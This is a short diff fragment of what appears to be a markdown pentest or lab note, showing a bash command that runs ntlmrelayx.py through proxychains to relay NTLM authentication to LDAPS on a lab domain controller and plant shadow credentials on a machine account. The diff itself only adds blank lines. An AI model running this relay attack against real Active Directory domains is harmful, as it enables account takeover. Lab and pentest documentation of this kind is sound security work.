@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:05.079234+00:00'
 ```bash
 proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
 ```
+
+
